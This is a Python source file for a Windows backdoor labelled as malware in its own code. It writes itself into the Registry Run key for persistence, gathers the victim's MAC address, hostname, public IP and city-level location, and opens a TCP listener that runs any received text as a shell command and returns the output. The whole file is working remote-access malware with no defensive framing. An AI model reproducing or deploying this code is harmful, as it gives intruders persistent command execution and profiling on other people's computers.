# Imports
import socket
import subprocess
import os
import urllib.request
import json
import platform
import uuid
import winreg


class Persistence:
    def __init__(self):
        self.check_reg()
    
    def add_reg(self):
        try:
            addr = r'c:/desktop/revShell_server.exe'
            reg_hkey = winreg.HKEY_CURRENT_USER
            key = winreg.OpenKey(reg_hkey, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'revShell_server', 0, winreg.REG_SZ, addr)
            winreg.CloseKey(key)
        except:
            pass

    def check_reg(self):
        try:
            reg_hkey = winreg.HKEY_CURRENT_USER
            key = winreg.OpenKey(reg_hkey, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
            index = 0
            while True:
                v = winreg.EnumValue(key, index)
                if 'revShell_server' not in v:
                    index+=1
                    continue
                return True
        except:
            winreg.CloseKey(key)
            self.add_reg()


class CommonData:
    def __init__(self):
        pass

    @property
    def mac(self):
        try:
            mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
            return mac
        except:
            return 'null'

    @property
    def hostname(self):
        try:
            hostname = socket.getfqdn(socket.gethostname()).strip()
            return hostname
        except:
            return 'null'

    @property
    def public_ip(self):
        try:
            return urllib.request.urlopen('https://api.ipify.org/').read().decode('utf8')
        except: 
            return 'null'

    @property
    def location(self):
        try:
            data = urllib.request.urlopen('https://freegeoip.app/json/').read().decode('utf8')
            json_data = json.loads(data)
            country_name = json_data['country_name']
            city = json_data['city']
            return '%s:%s' % (country_name, city)
        except:
            return 'null'

    @property
    def machine(self):
        try:
            return platform.system()
        except:
            return 'null'

    @property
    def core(self):
        try:
            return platform.machine()
        except:
            return 'null'


class reverseShell:
    # Class variables
    HOST = 'localhost'
    PORT = 5000
    BUFF_SIZE = 2048

    # Start socket/server initilization
    def __init__(self):
        # Create persistence for our reverse tcp shell exe on windows
        p = Persistence()
        # # Create TCP socket
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
        # Bind socket to the address (HOST:PORT)
        self.s.bind((self.HOST, self.PORT))
        # Listen for connections
        self.s.listen()
        print(f'[+] Listening on {self.HOST}:{self.PORT}')
        self.socket_init()
    
    def socket_init(self):
        # Accept connection (program will wait on accept until it recv a connection then we will jump to main() function)
        # client_socket: is a new socket object able to send&recv data on the connection
        # client_address: is the address bound to the socket
        self.client_socket, self.client_address = self.s.accept()
        print(f'[+] Accepted connection: {self.client_address[0]}:{self.client_address[1]}')
        self.main()

    def send_msg(self, msg):
        # Convert string(msg) into utf8 bytes
        msg = bytes(f'{msg}\n\n:> ', 'utf8')
        send = self.client_socket.sendall(msg)
        # Returns 'None' if sendall is successful
        return send

    def recv_msg(self):
        recv = self.client_socket.recv(self.BUFF_SIZE)
        # Return value is a bytes object representing the data received
        return recv

    def main(self):
        # Send connection msg to connected client
        if self.send_msg('[revShell] You have connected.') != None:
            print('[+] Error has occured')
        # Main part of our program, will run a continous while loop
        while True:
            try:
                msg = ''
                chunk = self.recv_msg()
                msg += chunk.strip().decode('utf8')
                # Headquarters(hq) for commands, functions, and so on using the recieved msg
                self.hq(msg)
            except:
                # Close socket
                self.client_socket.close()
                # Go to socket_init() method and listen for another connection
                self.socket_init()


    def hq(self, msg):
        try:
            # Data commands linked to data class and data methods
            if msg[:5] == 'data.':
                data = CommonData()
                if msg[:10] == 'data.mac':
                    self.send_msg(data.mac)
                elif msg[:13] == 'data.hostname':
                    self.send_msg(data.hostname)
                elif msg[:7] == 'data.ip':
                    self.send_msg(data.public_ip)
                elif msg[:13] == 'data.location':
                    self.send_msg(data.location)
                elif msg[:12] == 'data.machine':
                    self.send_msg(data.machine)
                elif msg[:9] == 'data.core':
                    self.send_msg(data.core)
                else:
                    self.send_msg('[revShell] No data command in that name. data.ip/location/machine/core only.')
            # Normal command promt commands using the shell
            else:
                tsk = subprocess.Popen(args=msg, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                stdout, stderr = tsk.communicate()
                # Result from subprocess shell stdout decoded in utf8
                myresult = stdout.decode('utf8')
                if msg[:2] == 'cd':
                    os.chdir(msg[3:])
                    self.send_msg('[revShell] *changed dir*')
                elif msg[:4] == 'exit':
                    # Close socket
                    self.client_socket.close()
                    # Go to socket_init() method and listen for another connection
                    self.socket_init()
                else:
                    # Send result to client
                    self.send_msg(f'{myresult}')
        except Exception as e:
            # print(e) # Debugging
            self.send_msg(f'[revShell] {e}')
            


if __name__=='__main__':
    malware = reverseShell()